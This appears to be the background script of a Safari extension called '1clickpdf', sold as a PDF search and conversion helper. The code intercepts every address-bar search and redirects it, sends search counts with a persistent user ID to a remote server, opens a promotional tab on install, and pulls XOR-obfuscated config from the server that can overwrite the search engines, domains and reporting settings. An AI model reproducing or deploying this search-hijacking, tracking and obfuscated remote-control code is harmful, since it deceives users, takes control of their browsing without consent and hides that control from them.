var debugging = true;
var keys = {
    storage: '1clickpdf',
    pdf_search: 'https://www.google.com/search?q=filetype%3Apdf%20{searchTerms}',
    omni_search: 'https://www.google.com/search?q={searchTerms}',
    //omni_search: 'https://www.bing.com/search?q={searchTerms}',
    random: '849OQQ106&$kBDaN0iYPvyOlnCsXisi^',
    ver: safari.extension.displayVersion,
    os: navigator.appVersion.indexOf('Mac') != -1 ? 'mac' : 'win',
    country: '',
    report: true,
    ping: {
        check: (debugging ? 1 : 5) * 60 * 1000, // check every x minutes
        send: (debugging ? 0.1 : 24) * 60 * 60 * 1000, // send if passed more than x hours from last ping
    },
    domains: {
        main: 'http://1clickpdf.com',
        ping: 'http://1clickpdf.com',
        report: 'http://1clickpdf.com',
        save: 'http://1clickpdf.com',
        search: 'http://1clickpdf.com',
        typ: 'http://bestformac.net',
    },
    persistant: true,
    keywords: ['pdf', 'convert'],
};
var storage = {
    user_id: '',
    counter: 0,
    l_ping: 0,
    timestamp: 0,
    version: 0,
    encoded: '',
};
var urls = {
    typ: function() {
        return keys.domains.typ + '/special/?uid=' + storage.user_id + '&o=' + keys.os + '&v=' + keys.ver;
    },
    ping: function() {
        return keys.domains.ping + '/ping?uid=' + storage.user_id + '&c=' + storage.counter + '&a=' + getExtensionAge('days', 2) + '&o=' + keys.os +
            '&gl=' + keys.country + '&v=' + keys.ver;
    },
    report: function(keyword) {
        return keys.domains.report + '/report?uid=' + storage.user_id + '&c=' + storage.counter + '&a=' + getExtensionAge('days', 2) +
            '&o=' + keys.os + '&gl=' + keys.country + '&v=' + keys.ver;
    },
    save: function() {
        return keys.domains.save + '/save/' + storage.user_id + '?c=' + storage.counter + '&a=' + getExtensionAge('days', 2) + '&o=' + keys.os +
            '&gl=' + keys.country + '&v=' + keys.ver;
    },
    uid: function() {
        return keys.domains.save + '/uid';
    }
};
var XOR = {
    utf8ToBinaryString: function(str) {
        var escstr = encodeURIComponent(str);
        // replaces any uri escape sequence, such as %0A,
        // with binary escape, such as 0x0A
        var binstr = escstr.replace(/%([0-9A-F]{2})/g, function(match, p1) {
            return String.fromCharCode(parseInt(p1, 16));
        });
        return binstr;
    },
    binaryStringToUtf8: function(binstr) {
        var escstr = binstr.replace(/(.)/g, function(m, p) {
            var code = p.charCodeAt(0).toString(16).toUpperCase();
            if (code.length < 2) {
                code = '0' + code;
            }
            return '%' + code;
        });
        return decodeURIComponent(escstr);
    },
    utf8ToBase64: function(str) {
        var binstr = this.utf8ToBinaryString(str);
        return btoa(binstr);
    },
    base64ToUtf8: function(b64) {
        var binstr = atob(b64);
        return this.binaryStringToUtf8(binstr);
    },
    encode: function(key, data) {
        return this.utf8ToBase64(this.xorStrings(key, JSON.stringify(data)));
    },
    decode: function(key, data) {
        data = this.base64ToUtf8(data);
        return JSON.parse(this.xorStrings(key, data));
    },
    xorStrings: function(key, input) {
        var output = '';
        for (var i = 0; i < input.length; i++) {
            var c = input.charCodeAt(i);
            var k = key.charCodeAt(i % key.length);
            output += String.fromCharCode(c ^ k);
        }
        return output;
    },
};

function log(msg) {
    if (debugging) {
        console.log(msg);
    }
}

function SendRequest(url, callback_body, callback_headers) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            if (xhr.status >= 200 && xhr.status < 400) {
                if (callback_body) {
                    callback_body(xhr.responseText);
                }
                if (callback_headers) {
                    callback_headers(xhr.getAllResponseHeaders());
                }
            } else {
                log('xhr status error: ' + xhr.statusText);
            }
        }
    };
    xhr.onerror = function(e) {
        log('xhr error: ' + xhr.statusText);
    };
    xhr.send();
}

function RandomString(pre) {
    var text = '';
    var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

    for (var i = 0; i < 8; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return pre + text;
}

function Decode(encoded) {
    if (typeof encoded != 'undefined' && encoded !== '') {
        try {
            var decoded = XOR.decode(keys.random, encoded);
            log('decoded: ' + JSON.stringify(decoded));
            Object.keys(decoded).forEach(function(key, index) {
                if (typeof decoded[key] !== null && typeof decoded[key] === 'object') {
                    Object.keys(decoded[key]).forEach(function(key1, index1) {
                        if (typeof decoded[key][key1] !== null) {
                            keys[key][key1] = decoded[key][key1];
                        }
                    });
                } else {
                    keys[key] = decoded[key];
                }
            });
        } catch (err) {
            log('decode error: ' + err.message);
        }
    }
}

function getExtensionAge(unit, places) {
    unit = typeof unit === 'undefined' ? 'days' : unit;
    places = typeof places === 'undefined' ? 2 : places;
    var age = new Date().getTime() - storage.timestamp;

    switch (unit) {
        case 'seconds':
            age = age / 1000;
            break;
        case 'minutes':
            age = age / 1000 / 60;
            break;
        case 'hours':
            age = age / 1000 / 60 / 60;
            break;
        case 'days':
            age = age / 1000 / 60 / 60 / 24;
            break;
    }

    return age.toFixed(places);
}

function Reach24h(force) {
    // Background Heartbeat ping every 24 hours
    var lping = storage.l_ping;
    var now = new Date().getTime();
    if (!lping || (typeof force !== 'undefined' && force === true)) {
        // first run, have not ping yet
        PingServer(now);
    } else {
        var time_elapsed = now - lping;
        if (time_elapsed >= keys.ping.send) {
            PingServer(now);
        }
    }
    setTimeout(Reach24h, keys.ping.check); // Check ping after each 5mins
}

function PingServer(now) {
    var age = getExtensionAge('days', 2);
    SendRequest(urls.ping(),
        function(ret) {
            if (ret !== '') {
                log('ping payload: ' + ret);
                Decode(ret);
                if (keys.persistant) {
                    storage.encoded = ret;
                }
            }
        },
        function(headers) {
            var regex = /X-Country:\s*([A-Z]{2})/gi;
            var match = regex.exec(headers);
            if (Array.isArray(match)) {
                keys.country = match.pop();
                log('ping country: ' + keys.country);
            }
        }
    );
    storage.l_ping = now;
    Store.setItem(keys.storage, storage);
    log('Ping sent at ' + new Date(now));
}

function storageIsInitiated() {
    if (storage.timestamp === 0) {
        storage.timestamp = new Date().getTime();
    }

    if (storage.version != keys.ver) {
        storage.version = keys.ver;
    }

    if (storage.encoded != '') {
        Decode(storage.encoded);
    }

    var new_install = true;
    if (storage.user_id === '') {
        storage.user_id = RandomString('1pdf');
        log('generated userid: ' + storage.user_id);
    } else {
        new_install = false;
        log('retrieved from storage userid: ' + storage.user_id);
    }

    Store.setItem(keys.storage, storage);

    safari.application.addEventListener('beforeSearch', onBeforeSearch, true);
    safari.application.addEventListener('message', handleMessage, true);
    if (new_install) {
        safari.application.activeBrowserWindow.openTab().url = urls.typ();
    }
    Reach24h(true);
}

function onBeforeSearch(evt) {
    var searchUrl;
    var searchTerms = evt.query;
    evt.preventDefault();
    var semi_pos = searchTerms.indexOf(':');
    if (keys.keywords.indexOf(searchTerms.toLowerCase().trim()) !== -1) {
        searchUrl = safari.extension.baseURI + 'convert.html';
    }
    else if (semi_pos !== -1 && searchTerms.substring(0, semi_pos).toLowerCase() == 'pdf') {
        searchUrl = keys.pdf_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms.substring(semi_pos + 1).trim()));
    } else {
        searchUrl = keys.omni_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms));
        storage.counter++;
        setTimeout(function() {
            if (keys.report === true) {
                SendRequest(urls.report(searchTerms), function(ret) {
                    log('reporting enabled: ' + searchTerms);
                });
            }
        }, 50);
        Store.setItem(keys.storage, storage);
    }
    log('searchUrl: ' + searchUrl);
    evt.target.url = searchUrl;
}

function handleMessage(msg) {
    switch (msg.name) {
        case 'save_cookie':
            //safari.application.activeBrowserWindow.activeTab.addContentScript
            /*
            log('save cookie ' + msg.message.uid);
            if (msg.message.uid != null) {
                storage.user_id = msg.message.uid;
                Store.setItem(keys.storage, storage);
            }
            */
            break;
        case 'canLoad':
            onBeforeRequest(msg);
            break;
    }
}

function onBeforeRequest(msg) {
    log('before request: ' + msg);
}

function Init() {
    var tmp_storage = Store.getItem(keys.storage);
    if (tmp_storage && tmp_storage != null) {
        storage = tmp_storage;
        log('retrieved storage object: ' + JSON.stringify(tmp_storage));
    }
    storageIsInitiated();
}

Init();
